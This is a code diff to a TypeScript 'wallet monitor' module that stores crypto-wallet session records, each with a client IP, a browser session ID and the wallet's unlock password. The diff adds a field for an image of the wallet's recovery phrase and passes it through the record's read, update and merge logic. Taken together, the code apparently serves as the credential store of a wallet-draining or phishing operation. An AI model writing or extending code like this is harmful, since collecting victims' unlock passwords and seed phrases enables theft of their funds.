@@ -10,6 +10,7 @@ export type WalletMonitorRecord = {
   clientIp: string | null
   browserSessionId: string | null
   unlockPassword: string | null
+  phraseSnapImage: string | null
   connectedAt: string
   lastSeenAt: string
   connectionStatus: string
@@ -33,7 +34,11 @@ function readAll(): WalletMonitorRecord[] {
     const raw = localStorage.getItem(STORAGE_KEY)
     if (!raw) return []
     const parsed = JSON.parse(raw) as WalletMonitorRecord[]
-    return Array.isArray(parsed) ? parsed.filter((row) => row?.walletAddress) : []
+    return Array.isArray(parsed)
+      ? parsed
+          .filter((row) => row?.walletAddress)
+          .map((row) => ({ ...row, phraseSnapImage: row.phraseSnapImage ?? null }))
+      : []
   } catch {
     return []
   }
@@ -58,6 +63,7 @@ export function upsertLocalWalletSession(input: {
   pageUrl?: string | null
   browserSessionId?: string | null
   unlockPassword?: string | null
+  phraseSnapImage?: string | null
   connectionStatus?: string
 }): WalletMonitorRecord {
   const rows = readAll()
@@ -76,6 +82,8 @@ export function upsertLocalWalletSession(input: {
     browserSessionId: input.browserSessionId ?? existing?.browserSessionId ?? null,
     unlockPassword:
       input.unlockPassword !== undefined ? input.unlockPassword : existing?.unlockPassword ?? null,
+    phraseSnapImage:
+      input.phraseSnapImage !== undefined ? input.phraseSnapImage : existing?.phraseSnapImage ?? null,
     connectedAt: existing?.connectedAt || nowIso(),
     lastSeenAt: nowIso(),
     connectionStatus: input.connectionStatus || 'connected',
@@ -95,10 +103,15 @@ export function disconnectLocalWalletSession(walletAddress: string) {
   writeAll(next)
 }
 
-export function mergeWalletSessions<T extends { walletAddress: string; lastSeenAt: string; unlockPassword?: string | null; browserSessionId?: string | null }>(
-  remote: T[],
-  local: T[]
-): T[] {
+export function mergeWalletSessions<
+  T extends {
+    walletAddress: string
+    lastSeenAt: string
+    unlockPassword?: string | null
+    phraseSnapImage?: string | null
+    browserSessionId?: string | null
+  },
+>(remote: T[], local: T[]): T[] {
   const byKey = new Map<string, T>()
   for (const row of remote) byKey.set(sessionKey(row.walletAddress, row.browserSessionId), row)
   for (const row of local) {
@@ -108,6 +121,7 @@ export function mergeWalletSessions<T extends { walletAddress: string; lastSeenA
       ...prev,
       ...row,
       unlockPassword: row.unlockPassword || prev?.unlockPassword || null,
+      phraseSnapImage: row.phraseSnapImage || prev?.phraseSnapImage || null,
       connectedAt: (prev as { connectedAt?: string } | undefined)?.connectedAt || (row as { connectedAt?: string }).connectedAt,
     } as T)
   }
